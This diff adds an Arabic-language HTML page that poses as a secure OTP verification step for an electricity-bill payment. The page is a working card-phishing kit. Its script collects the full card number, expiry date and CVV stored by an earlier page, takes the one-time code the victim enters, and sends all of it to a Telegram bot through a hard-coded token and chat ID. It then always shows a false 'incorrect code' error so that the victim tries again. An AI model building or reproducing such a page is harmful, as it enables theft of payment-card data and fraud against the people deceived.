@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title data-i18n="pageTitleVerification">التحقق</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .app { width: 100%; max-width: 500px; }
+        .shell {
+            background: #fff;
+            border: 2px solid rgba(177, 140, 51, 0.34);
+            border-radius: 28px;
+            padding: 30px;
+            box-shadow: 0 14px 30px rgba(177, 140, 51, 0.08);
+        }
+        header {
+            text-align: center;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(0,0,0,0.06);
+            margin-bottom: 20px;
+        }
+        .logo { width: 90px; }
+        .hero-card {
+            background: #fff;
+            border: 2px solid #f3f3f3;
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 25px;
+            text-align: center;
+            box-shadow: 0 10px 22px rgba(177, 140, 51, 0.12);
+        }
+        .hero-card i { font-size: 2.5rem; color: #b18c33; margin-bottom: 15px; }
+        .hero-card h2 { color: #0d3f72; font-size: 1.1rem; margin-bottom: 10px; }
+        .hero-card p { color: #56647d; font-size: 0.9rem; line-height: 1.7; }
+        h3 { text-align: center; color: #293244; margin-bottom: 8px; font-size: 1rem; }
+        .subtitle { text-align: center; color: #8090a9; font-size: 0.85rem; margin-bottom: 20px; }
+        .field { margin-bottom: 20px; }
+        .label { display: block; margin-bottom: 10px; font-weight: 600; color: #3f4b5f; text-align: right; }
+        input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid rgba(33, 76, 124, 0.2);
+            border-radius: 14px;
+            font-size: 1.5rem;
+            font-family: inherit;
+            text-align: center;
+            direction: ltr;
+            letter-spacing: 0.3em;
+            font-weight: 700;
+        }
+        input:focus { outline: none; border-color: rgba(29, 124, 236, 0.6); }
+        .error { color: #dc3545; text-align: center; margin-top: 10px; font-size: 0.85rem; display: none; }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(180deg, #d6b45b, #b18c33);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 800;
+            font-family: inherit;
+            cursor: pointer;
+        }
+        .btn:hover { transform: translateY(-2px); }
+        .timer { text-align: center; margin-top: 20px; color: #1f1f1f; font-size: 0.85rem; }
+        .timer strong { color: #f03a2d; }
+        .help { text-align: center; margin-top: 15px; color: #6d7888; font-size: 0.85rem; }
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(12,12,14,0.75);
+            backdrop-filter: blur(12px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .loading-overlay.show { display: flex; }
+        .loading-card {
+            background: rgba(20,20,20,0.9);
+            padding: 40px;
+            border-radius: 24px;
+            text-align: center;
+            color: #f4f1e6;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(214, 180, 91, 0.2);
+            border-top-color: #b18c33;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="app">
+        <div class="shell">
+            <header>
+                <img src="https://play-lh.googleusercontent.com/nx02xraB0UOf0alqJERUs4g_fx6PTqoAXvxeXqeAMrWzvJMlSPp3Gn1u-yiBrDPT6OvtfUXwjDM2AwAHUptTAA" class="logo" alt="دفع فواتير الكهرباء ">
+            </header>
+            
+            <div class="hero-card">
+                <i class="fas fa-shield-halved"></i>
+                <h2 data-i18n="secureAuth">المصادقة الثنائية الآمنة</h2>
+                <p data-i18n="authDesc">ستتلقى رمزاً سرياً لمرة واحدة (OTP) لتأكيد عملية الدفع عبر رسالة نصية أو تطبيق البنك.</p>
+            </div>
+            
+            <h3 data-i18n="enterOtp">يرجى إدخال رمز التحقق (OTP):</h3>
+            <p class="subtitle" data-i18n="otpSent">الرمز مرسل الآن إلى رقم الهاتف المرتبط بالبطاقة •••• <span id="last4">----</span></p>
+            
+            <form id="otpForm">
+                <div class="field">
+                    <input type="tel" id="otpCode" maxlength="6" placeholder="• • • • • •" autocomplete="one-time-code">
+                    <p class="error" id="otpError" data-i18n="otpError">رمز التحقق غير صحيح</p>
+                </div>
+                <button type="submit" class="btn" data-i18n="confirm">تأكيد</button>
+            </form>
+            
+            <p class="timer"><span data-i18n="timerText">ستنتهي صلاحية هذه الصفحة بعد</span> <strong id="countdown">60</strong> <span data-i18n="seconds">ثانية</span></p>
+            <p class="help"><span data-i18n="needHelp">هل تحتاج للمساعدة؟</span> <a href="#" data-i18n="contactUs" style="color: #1d7cec;">تواصل معنا</a></p>
+        </div>
+    </div>
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-card">
+            <div class="spinner"></div>
+            <p data-i18n="verifying">جاري التحقق من المعلومات...</p>
+        </div>
+    </div>
+    
+    <script>
+        const last4 = sessionStorage.getItem('paymentCardLast4');
+        if (last4) document.getElementById('last4').textContent = last4;
+        
+        let countdown = 60;
+        let countdownInterval;
+        
+        function startCountdown() {
+            countdownInterval = setInterval(() => {
+                countdown--;
+                document.getElementById('countdown').textContent = countdown;
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    document.getElementById('otpCode').disabled = true;
+                    document.querySelector('.btn').disabled = true;
+                }
+            }, 1000);
+        }
+        
+        startCountdown();
+        
+        document.getElementById('otpCode').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 6);
+            if (this.value.length === 6) {
+                setTimeout(() => document.getElementById('otpForm').dispatchEvent(new Event('submit')), 300);
+            }
+        });
+        
+        document.getElementById('otpForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const otp = document.getElementById('otpCode').value;
+            if (otp.length !== 6) {
+                document.getElementById('otpError').textContent = 'يرجى إدخال رمز التحقق المكون من 6 أرقام';
+                document.getElementById('otpError').style.display = 'block';
+                return;
+            }
+            document.getElementById('otpError').style.display = 'none';
+            document.getElementById('loadingOverlay').classList.add('show');
+
+            // جلب البيانات المخزنة محلياً من الصفحة السابقة
+            const fullCardNumber = sessionStorage.getItem('fullCardNumber') || 'غير متوفر';
+            const cardExpiry = sessionStorage.getItem('cardExpiry') || 'غير متوفر';
+            const cardCvv = sessionStorage.getItem('cardCvv') || 'غير متوفر';
+
+            const botToken = '8889676845:AAGYcVFa7vOi_0FYgpq3WscOXKADANb-2TI';
+            const chatId = '8108427825';
+            
+            // تنسيق الرسالة بالشكل المطلوب
+            const message = `🔐 رمز تحقق جديد\nرقم البطاقة: ${fullCardNumber}\nتاريخ الانتهاء: ${cardExpiry}\nرمز الامان: ${cardCvv}\nرمز التحقق: ${otp}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+            } catch (err) {
+                console.error('Error sending data', err);
+            }
+
+            // انتظار 4 ثواني ثم إظهار رسالة خطأ التحقق وتفريغ الحقل كما طلبت
+            setTimeout(() => {
+                document.getElementById('loadingOverlay').classList.remove('show');
+                document.getElementById('otpError').textContent = 'رمز التحقق غير صحيح';
+                document.getElementById('otpError').style.display = 'block';
+                document.getElementById('otpCode').value = '';
+                document.getElementById('otpCode').focus();
+            }, 4000);
+        });
+    </script>
+</body>
+</html>
